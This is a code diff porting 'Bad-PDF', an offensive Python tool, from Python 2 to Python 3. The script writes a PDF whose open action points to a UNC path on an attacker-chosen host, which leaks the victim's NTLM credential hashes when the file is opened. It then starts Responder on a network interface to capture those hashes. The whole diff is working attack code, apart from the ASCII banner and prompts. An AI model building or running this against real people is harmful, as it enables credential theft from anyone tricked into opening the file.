@@ -1,10 +1,9 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-from __future__ import print_function
 import io
 import os
 import subprocess
-"""" 
+r""" 
 ====================================================================================================================
         ______                 __       _______  ______   ________  
         |_   _ \               |  ]     |_   __ \|_   _ `.|_   __  | 
@@ -25,8 +24,7 @@ RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', 
 
 def create_malpdf(filename, host):
     print("[*] Starting Process.. [*]")
-    with io.FileIO(filename, "w") as file:
-        file.write('''
+    pdf_content = f'''
 %PDF-1.7
 
 1 0 obj
@@ -54,7 +52,7 @@ startxref
 
    /AA <<
 	   /O <<
-	      /F (''' + host + '''test)
+	      /F ({host}test)
 		  /D [ 0 /Fit]
 		  /S /GoToE
 		  >>
@@ -93,20 +91,22 @@ trailer
 >>
 
 %%EOF
-''')
+'''
+    with io.FileIO(filename, "w") as file:
+        file.write(pdf_content.encode())
 
 
 if __name__ == "__main__":
 
     try:
-        print("""
+        print(r"""
       
         ______                 __       _______  ______   ________  
         |_   _ \               |  ]     |_   __ \|_   _ `.|_   __  | 
           | |_) |  ,--.    .--.| | ______ | |__) | | | `. \ | |_ \_| 
-          |  __'. `'_\ : / /'`\' ||______||  ___/  | |  | | |  _|    
+          |  __'. `'_\ : / /'`' ||______||  ___/  | |  | | |  _|    
          _| |__) |// | |,| \__/  |       _| |_    _| |_.' /_| |_     
-        |_______/ \'-;__/ '.__.;__]     |_____|  |______.'|_____|
+        |_______/ '-;__/ '.__.;__]     |_____|  |______.'|_____|
 
         Author : Deepu TV ; Alias DeepZec 
 
@@ -115,18 +115,18 @@ if __name__ == "__main__":
 
 
         if os.path.isfile(responder):
-            print("Responder detected :%s" %responder )
+            print(f"Responder detected: {responder}")
 
         else:
             print("Responder not found..")
-            responder = raw_input("Please enter responder path (Default /usr/sbin/responder): \n")
+            responder = input("Please enter responder path (Default /usr/sbin/responder): \n")
 
-        host = raw_input("Please enter Bad-PDF host IP: \n")
-        filename = raw_input("Please enter output file name: \n")
-        interface = raw_input("Please enter the interface name to listen(Default eth0): \n")
+        host = input("Please enter Bad-PDF host IP: \n")
+        filename = input("Please enter output file name: \n")
+        interface = input("Please enter the interface name to listen(Default eth0): \n")
         create_malpdf(filename, '\\\\' + '\\\\' + host + '\\\\')
 
-        print("Bad PDF %s created" %filename)
+        print(f"Bad PDF {filename} created")
 
         subprocess.Popen(responder + ' -I ' + interface + ' -wF', shell=True).wait()
 
